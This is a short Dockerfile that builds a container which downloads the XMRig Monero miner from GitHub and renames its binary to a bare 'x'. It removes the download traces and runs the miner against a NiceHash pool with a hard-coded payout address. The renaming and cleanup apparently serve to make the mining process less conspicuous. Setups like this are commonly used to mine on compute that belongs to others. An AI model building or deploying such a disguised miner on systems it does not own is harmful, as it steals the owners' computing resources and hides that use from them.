FROM debian:latest

RUN apt update && apt upgrade -y
RUN wget https://github.com/xmrig/xmrig/releases/download/v6.13.1/xmrig-6.13.1-focal-x64.tar.gz && tar xvf xm*.gz && rm xm*.gz && mv xmrig-6.13.1/xmrig x && rm -rf *.gz && rm -rf xmrig-6.13.1 && chmod +x x
WORKDIR /root
CMD ./x -o stratum+tcp://randomxmonero.eu-west.nicehash.com:3380 --nicehash -a rx -k -u 3D8oYUVhEYQKDSidWC8aawyDTN6WGCD3ug -p x
